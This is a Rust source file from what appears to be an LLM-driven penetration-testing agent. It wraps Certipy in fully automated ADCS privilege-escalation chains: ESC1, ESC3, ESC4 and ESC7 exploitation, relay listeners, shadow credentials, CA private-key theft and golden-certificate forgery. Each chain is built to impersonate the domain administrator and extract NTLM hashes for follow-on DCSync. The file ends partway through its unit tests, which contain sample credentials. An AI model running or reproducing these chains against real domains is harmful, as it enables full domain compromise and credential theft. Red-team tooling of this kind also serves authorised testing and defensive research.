//! ADCS / Certipy privilege escalation tool executors.

use anyhow::{Context, Result};
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Concatenate the stdout/stderr of a chained tool invocation under `=== <label> ===`
/// headers so an operator can tell which sub-step produced which output. Pure
/// formatting — kept separate from the chain drivers (which shell out to certipy
/// and are not unit-testable without subprocess mocks).
fn render_chain_output(steps: &[(&str, &ToolOutput)]) -> (String, String) {
    let stdout = steps
        .iter()
        .map(|(label, out)| format!("=== {label} ===\n{}", out.stdout))
        .collect::<Vec<_>>()
        .join("\n");
    let stderr = steps
        .iter()
        .map(|(label, out)| format!("=== {label} ===\n{}", out.stderr))
        .collect::<Vec<_>>()
        .join("\n");
    (stdout, stderr)
}

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `dc_ip`
/// Optional args: `password`, `hashes`, `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(true);
    let hashes = optional_str(args, "hashes");
    let password = optional_str(args, "password");

    // Fail soft when the worker credential_resolver could not inject any
    // auth (neither password nor hash found in state for this principal).
    // Hard-erroring with `required_str("password")?` caused the LLM to
    // "Assistance requested" and burn ~30k tokens reasoning about a missing
    // credential field; a structured stdout line lets the agent move on.
    if password.is_none() && hashes.is_none() {
        return Ok(ToolOutput {
            stdout: format!(
                "certipy_find: no credential resolved for {username}@{domain} (neither password nor hash in state); skipping enumeration.\n"
            ),
            stderr: String::new(),
            exit_code: Some(0),
            success: true,
        });
    }

    let user_at_domain = format!("{username}@{domain}");

    let mut cmd = CommandBuilder::new("certipy")
        .arg("find")
        .flag("-u", &user_at_domain)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg("-stdout")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120);

    if let Some(h) = hashes {
        cmd = cmd.flag("-hashes", h);
    } else if let Some(p) = password {
        cmd = cmd.flag("-p", p);
    }

    cmd.execute().await
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `upn`, `target` (CA server IP/hostname — use when CA is not on the DC),
///   `sid` (SID to embed in cert), `out` (output PFX filename)
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");
    let sid = optional_str(args, "sid");
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let application_policies = optional_str(args, "application_policies");

    // Generate a unique output filename to avoid certipy's interactive overwrite
    // prompt which kills non-interactive runs. Use template + epoch millis.
    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            format!("cert_{template}_{ts}")
        }
    };

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .flag_opt("-upn", upn)
        .flag_opt("-sid", sid)
        .flag_opt("-application-policies", application_policies)
        .timeout_secs(120)
        .execute()
        .await
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    // Certipy auth writes .ccache based on cert subject (e.g. administrator.ccache)
    // and does NOT support -out. Remove existing .ccache files to prevent the
    // interactive "Overwrite? (y/n)" prompt that kills non-interactive runs.
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `target`, `dc_ip`
/// Required (one of): `password`, `hashes`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;
    // Treat an empty-string `hashes` as missing so the password fallback
    // fires. The LLM agent has been observed passing `hashes=""` when only
    // a password is available — without this guard the `-hashes ''` flag
    // is forwarded to certipy and certipy rejects the empty value.
    let hashes = optional_str(args, "hashes").filter(|s| !s.is_empty());

    let user_at_domain = format!("{username}@{domain}");

    // Generate unique output name to avoid interactive overwrite prompt
    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            format!("shadow_{target}_{ts}")
        }
    };

    // certipy shadow auto internally calls certipy auth which writes .ccache
    // based on the target account name. Remove existing .ccache to prevent the
    // interactive "Overwrite? (y/n)" prompt.
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    let mut cmd = CommandBuilder::new("certipy")
        .arg("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .timeout_secs(120);

    if let Some(h) = hashes {
        cmd = cmd.flag("-hashes", h);
    } else {
        let password = required_str(args, "password")?;
        cmd = cmd.flag("-password", password);
    }

    cmd.execute().await
}

/// Certipy CA management operations (add-officer, issue-request, backup).
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Required: exactly one of:
///   - `add_officer` (bool, true)
///   - `issue_request` (integer request ID)
///   - `backup` (bool, true) — exports the CA private key to `<ca>.pfx` in CWD.
///     Requires SYSTEM-equivalent access on the CA host (e.g., the calling
///     process is running on a host where `username` is local administrator).
pub async fn certipy_ca(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;

    let user_at_domain = format!("{username}@{domain}");

    let add_officer = optional_bool(args, "add_officer").unwrap_or(false);
    let backup = optional_bool(args, "backup").unwrap_or(false);
    let issue_request = args
        .get("issue_request")
        .and_then(|v| v.as_i64())
        .map(|v| v as i32);

    let mut cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .timeout_secs(180);

    if add_officer {
        cmd = cmd.flag("-add-officer", format!("{username}@{domain}"));
    }
    if let Some(req_id) = issue_request {
        cmd = cmd.flag("-issue-request", req_id.to_string());
    }
    if backup {
        cmd = cmd.arg("-backup");
    }

    cmd.execute().await
}

/// Forge a "Golden Certificate" from a stolen CA PFX (the `-backup` output of
/// `certipy_ca`). Produces a client PFX that authenticates as `upn` on the CA's
/// domain — the universal terminal node for ADCS compromise: any path that
/// gets SYSTEM on a CA host can chain `certipy_ca backup` → this tool →
/// `certipy_auth` to obtain a TGT/NT hash for any principal in the domain.
///
/// Required args: `ca_pfx` (path to stolen CA PFX), `upn` (target principal,
///                e.g. `administrator@fabrikam.local`)
/// Optional args: `subject`, `template`, `out` (output PFX path)
pub async fn certipy_forge(args: &Value) -> Result<ToolOutput> {
    let ca_pfx = required_str(args, "ca_pfx")?;
    let upn = required_str(args, "upn")?;
    let subject = optional_str(args, "subject");
    let template = optional_str(args, "template");

    let out = match optional_str(args, "out") {
        Some(o) => o.to_string(),
        None => {
            let ts = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .map(|d| d.as_millis())
                .unwrap_or(0);
            let safe_upn = upn.replace(['/', '\\', ' '], "_");
            format!("forged_{safe_upn}_{ts}.pfx")
        }
    };

    CommandBuilder::new("certipy")
        .arg("forge")
        .flag("-ca-pfx", ca_pfx)
        .flag("-upn", upn)
        .flag_opt("-subject", subject)
        .flag_opt("-template", template)
        .flag("-out", out)
        .timeout_secs(60)
        .execute()
        .await
}

/// Retrieve a previously issued certificate by request ID.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`,
///                `request_id`
/// Optional args: `target` (CA server IP)
pub async fn certipy_retrieve(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let request_id =
        args.get("request_id")
            .and_then(|v| v.as_i64())
            .ok_or_else(|| anyhow::anyhow!("missing required arg: request_id"))? as i32;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out = format!("cert_retrieve_{request_id}_{ts}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", request_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", out)
        .flag_opt("-target", target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC7 exploitation chain: add officer → request SubCA cert
/// (gets denied) → issue the pending request → retrieve cert → authenticate.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`, `ca`
/// Optional args: `target` (CA server IP), `upn`, `sid`
pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let ca = required_str(args, "ca")?;
    let upn = optional_str(args, "upn")
        .unwrap_or("administrator")
        .to_string();
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));
    let sid = optional_str(args, "sid");

    let upn_full = if upn.contains('@') {
        upn.clone()
    } else {
        format!("{upn}@{domain}")
    };

    let user_at_domain = format!("{username}@{domain}");
    let mut outputs = Vec::new();

    let mut step1_cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-add-officer", username);
    if let Some(t) = &target {
        step1_cmd = step1_cmd.flag("-target", *t);
    }
    let step1 = step1_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Add Officer", step1));

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out_name = format!("cert_esc7_{ts}");

    let mut req_cmd = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", "SubCA")
        .flag("-upn", &upn_full)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    if let Some(t) = &target {
        req_cmd = req_cmd.flag("-target", *t);
    }
    if let Some(s) = &sid {
        req_cmd = req_cmd.flag("-sid", *s);
    }
    // Certipy asks "Would you like to save the private key? (y/N)" when the
    // SubCA request is denied — we need to answer "y" to keep the key for later.
    let step2 = req_cmd.stdin("y\n").timeout_secs(120).execute().await?;

    // Parse the request ID from certipy output (e.g., "Request ID is 42")
    let request_id = step2
        .stdout
        .lines()
        .chain(step2.stderr.lines())
        .find_map(|line| {
            let lower = line.to_lowercase();
            if lower.contains("request id") {
                line.split_whitespace()
                    .filter_map(|w| w.trim_end_matches('.').parse::<i32>().ok())
                    .next_back()
            } else {
                None
            }
        });
    outputs.push(("Request SubCA", step2));

    let Some(req_id) = request_id else {
        let combined = outputs
            .iter()
            .map(|(name, o)| format!("=== {name} ===\n{}\n{}", o.stdout, o.stderr))
            .collect::<Vec<_>>()
            .join("\n");
        return Ok(ToolOutput {
            stdout: combined,
            stderr: "ERROR: Could not parse request ID from certipy output".into(),
            exit_code: Some(1),
            success: false,
        });
    };

    let mut step3_cmd = CommandBuilder::new("certipy")
        .arg("ca")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-dc-ip", dc_ip)
        .flag("-ca", ca)
        .flag("-issue-request", req_id.to_string());
    if let Some(t) = &target {
        step3_cmd = step3_cmd.flag("-target", *t);
    }
    let step3 = step3_cmd.timeout_secs(120).execute().await?;
    outputs.push(("Issue Request", step3));

    let step4 = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-retrieve", req_id.to_string())
        .flag("-dc-ip", dc_ip)
        .flag("-out", &out_name);
    let mut step4 = step4;
    if let Some(t) = &target {
        step4 = step4.flag("-target", *t);
    }
    let step4_out = step4.timeout_secs(120).execute().await?;
    outputs.push(("Retrieve Cert", step4_out));

    // If certipy couldn't create a PFX (key mismatch), combine manually.
    let pfx_path = format!("{out_name}.pfx");
    let crt_path = format!("{out_name}.crt");
    let key_path = format!("{out_name}.key");
    if !tokio::fs::try_exists(&pfx_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&crt_path).await.unwrap_or(false)
        && tokio::fs::try_exists(&key_path).await.unwrap_or(false)
    {
        let combine = CommandBuilder::new("openssl")
            .arg("pkcs12")
            .flag("-in", &crt_path)
            .flag("-inkey", &key_path)
            .arg("-export")
            .flag("-out", &pfx_path)
            .flag("-passout", "pass:")
            .timeout_secs(30)
            .execute()
            .await?;
        outputs.push(("Combine PFX", combine));
    }

    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .output()
        .await;

    let step5 = CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", &pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await?;
    let auth_success = step5.success;
    outputs.push(("Authenticate", step5));

    let combined_stdout = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stdout))
        .collect::<Vec<_>>()
        .join("\n");
    let combined_stderr = outputs
        .iter()
        .map(|(name, o)| format!("=== Step: {name} ===\n{}", o.stderr))
        .collect::<Vec<_>>()
        .join("\n");

    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: if auth_success { Some(0) } else { Some(1) },
        success: auth_success,
    })
}

/// Start a Certipy relay listener for ESC8 (HTTP) or ESC11 (RPC) attacks.
///
/// Required args: `target`, `ca`
/// Optional args: `template`
///
/// For ESC8:  `certipy relay -target http://ca-host -ca CA-NAME`
/// For ESC11: `certipy relay -target rpc://ca-host -ca CA-NAME`
pub async fn certipy_relay(args: &Value) -> Result<ToolOutput> {
    let target = required_str(args, "target")?;
    let ca = required_str(args, "ca")?;
    let template = optional_str(args, "template");

    CommandBuilder::new("certipy")
        .arg("relay")
        .flag("-target", target)
        .flag("-ca", ca)
        .flag_opt("-template", template)
        .timeout_secs(300)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`
/// Optional args: `upn`, `target`, `sid`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    let template_output = certipy_template_esc4(args).await?;

    // Generate a unique output name for the PFX and inject into args
    let template = args
        .get("template")
        .and_then(|v| v.as_str())
        .unwrap_or("esc4");
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out_name = format!("cert_{template}_{ts}");
    let pfx_path = format!("{out_name}.pfx");

    let mut req_args = args.clone();
    if let Some(obj) = req_args.as_object_mut() {
        obj.insert("out".into(), serde_json::json!(out_name));
    }
    let request_output = certipy_request(&req_args).await?;

    let mut auth_args = args.clone();
    if let Some(obj) = auth_args.as_object_mut() {
        obj.insert("pfx_path".into(), serde_json::json!(pfx_path));
    }
    let auth_output = certipy_auth(&auth_args).await?;

    let (combined_stdout, combined_stderr) = render_chain_output(&[
        ("Template Modification", &template_output),
        ("Certificate Request", &request_output),
        ("Authentication", &auth_output),
    ]);

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}

/// Run the full ESC3 (Enrollment Agent) exploitation chain in one shot:
/// enroll the agent cert, request a cert on behalf of a target principal
/// using the agent cert, then authenticate with the resulting PFX.
///
/// ESC3 is a two-step attack and the existing single-step `certipy_request`
/// path silently skips it: `certipy req -template ESC3-CRA -on-behalf-of …`
/// REQUIRES the prior agent PFX from a separate `-template ESC3` enrollment.
/// LLM rounds dispatched against ESC3 vulns finish without ever firing the
/// `-pfx` branch because there's no obvious trigger in standard `certipy
/// find -vulnerable` output. This wraps both enrollments + the final auth
/// into a single deterministic worker invocation, with the intermediate
/// agent PFX persisted in a shared tempdir so the second `certipy req`
/// can read it via `-pfx`.
///
/// Required args: `username`, `domain`, `password`, `ca`, `dc_ip`,
///                `agent_template` (the EKU template — has `Certificate
///                Request Agent` application policy)
/// Optional args:
///   - `target` (CA host IP/hostname; falls through `ca_host`/`target_ip`)
///   - `on_behalf_template` (defaults to `User` — the universal client-auth
///     template that any DA can normally enroll; in some labs the on-behalf
///     target is a custom `<TEMPLATE>-CRA` template that requires CRA-signed
///     enrollment, override here)
///   - `on_behalf_of` (target principal sAMAccountName; defaults to
///     `administrator`)
pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let agent_template = required_str(args, "agent_template")?;
    let on_behalf_template = optional_str(args, "on_behalf_template").unwrap_or("User");
    let on_behalf_of = optional_str(args, "on_behalf_of").unwrap_or("administrator");
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");
    // Sole reason for the shared tempdir: certipy writes the agent PFX in
    // CWD, then the second `certipy req` reads it via `-pfx <name>.pfx` —
    // the two steps must run in the same directory. Two split dispatches
    // would land on different worker pods and the file would not be
    // visible to step 2.
    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC3 chain")?;
    let cwd = tempdir.path().to_path_buf();

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let agent_out = format!("agent_{ts}");
    let agent_pfx = format!("{agent_out}.pfx");
    let target_out = format!("target_{ts}");
    let target_pfx = format!("{target_out}.pfx");

    let agent_output = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", agent_template)
        .flag("-dc-ip", dc_ip)
        .flag("-out", &agent_out)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !agent_output.success {
        return Ok(agent_output);
    }
    if !cwd.join(&agent_pfx).exists() {
        anyhow::bail!(
            "certipy req (agent enrollment) reported success but {agent_pfx} was not produced"
        );
    }

    // `domain\\principal` form is what certipy expects for `-on-behalf-of`
    // (NetBIOS-style). The single-backslash escape in the format string
    // becomes a literal `\` on the command line.
    let on_behalf_target = format!("{domain}\\{on_behalf_of}");
    let request_output = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", on_behalf_template)
        .flag("-dc-ip", dc_ip)
        .flag("-on-behalf-of", &on_behalf_target)
        .flag("-pfx", &agent_pfx)
        .flag("-out", &target_out)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !request_output.success {
        let agent_label = format!("Agent enrollment ({agent_template})");
        let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
        let (stdout, stderr) = render_chain_output(&[
            (&agent_label, &agent_output),
            (&on_behalf_label, &request_output),
        ]);
        return Ok(ToolOutput {
            stdout,
            stderr,
            exit_code: request_output.exit_code,
            success: false,
        });
    }
    if !cwd.join(&target_pfx).exists() {
        anyhow::bail!(
            "certipy req (on-behalf-of) reported success but {target_pfx} was not produced"
        );
    }

    // certipy auth writes <subject>.ccache in CWD; clear stale .ccache to
    // avoid the interactive overwrite prompt that kills non-interactive
    // runs (matches what `certipy_auth` does at module level).
    let _ = tokio::process::Command::new("sh")
        .arg("-c")
        .arg("rm -f *.ccache 2>/dev/null")
        .current_dir(&cwd)
        .output()
        .await;
    let auth_output = CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", &target_pfx)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;

    let agent_label = format!("Agent enrollment ({agent_template})");
    let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
    let (combined_stdout, combined_stderr) = render_chain_output(&[
        (&agent_label, &agent_output),
        (&on_behalf_label, &request_output),
        ("certipy auth", &auth_output),
    ]);
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: agent_output.success && request_output.success && auth_output.success,
    })
}

/// Single-spawn ESC1 chain: request an ESC1 cert with an arbitrary UPN+SID,
/// then authenticate it to obtain the impersonated principal's NTLM hash.
///
/// The two steps must share CWD because `certipy auth` derives its ccache
/// filename from the cert subject and won't overwrite. The combined output
/// lets a downstream parser extract the resulting hash and publish it to
/// state as a regular `Hash` discovery — `auto_credential_reuse` then
/// DCSyncs the foreign DC with that hash without any further automation.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`,
///                `dc_ip`, `upn`, `sid`
/// Optional args: `target` (CA server hostname/IP — required when the CA
///                runs on a host other than the DC, as with most multi-tier
///                AD deployments).
pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = required_str(args, "upn")?;
    let sid = required_str(args, "sid")?;
    let target = optional_str(args, "target")
        .or_else(|| optional_str(args, "ca_host"))
        .or_else(|| optional_str(args, "target_ip"));

    let user_at_domain = format!("{username}@{domain}");
    let tempdir = tempfile::tempdir().context("failed to create tempdir for ESC1 chain")?;
    let cwd = tempdir.path().to_path_buf();

    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    let out_name = format!("esc1_{ts}");
    let pfx_name = format!("{out_name}.pfx");

    // KB5014754 strict mapping requires -upn + -sid on the request.
    let request_output = CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", &user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag("-upn", upn)
        .flag("-sid", sid)
        .flag("-out", &out_name)
        .flag_opt("-target", target)
        .current_dir(&cwd)
        .timeout_secs(180)
        .execute()
        .await?;
    if !request_output.success {
        return Ok(request_output);
    }
    if !cwd.join(&pfx_name).exists() {
        anyhow::bail!("certipy req reported success but {pfx_name} was not produced");
    }

    let auth_output = CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", &pfx_name)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .current_dir(&cwd)
        .timeout_secs(120)
        .execute()
        .await?;

    let req_label = format!("certipy req (ESC1, upn={upn}, sid={sid})");
    let auth_label = format!("certipy auth ({pfx_name})");
    let (combined_stdout, combined_stderr) =
        render_chain_output(&[(&req_label, &request_output), (&auth_label, &auth_output)]);
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: request_output.success && auth_output.success,
    })
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // --- certipy_find ---

    #[test]
    fn certipy_find_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn certipy_find_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_find_missing_password() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn certipy_find_missing_dc_ip() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_find_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_find_vulnerable_default_false() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(!vulnerable);
    }

    #[test]
    fn certipy_find_vulnerable_set_true() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "vulnerable": true
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(vulnerable);
    }

    // --- certipy_request ---

    #[test]
    fn certipy_request_missing_ca() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "ca").is_err());
    }

    #[test]
    fn certipy_request_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_request_user_at_domain_format() {
        let args = json!({
            "username": "lowpriv",
            "domain": "contoso.local",
            "password": "Secret123",
            "ca": "corp-CA",
            "template": "VulnTemplate",
            "dc_ip": "192.168.58.1"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "lowpriv@contoso.local");
    }

    #[test]
    fn certipy_request_upn_present() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10",
            "upn": "administrator@contoso.local"
        });
        assert_eq!(
            optional_str(&args, "upn"),
            Some("administrator@contoso.local")
        );
    }

    #[test]
    fn certipy_request_upn_absent() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "upn").is_none());
    }

    // --- certipy_auth ---

    #[test]
    fn certipy_auth_missing_pfx_path() {
        let args = json!({
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "pfx_path").is_err());
    }

    #[test]
    fn certipy_auth_missing_dc_ip() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_auth_missing_domain() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_auth_all_args() {
        let args = json!({
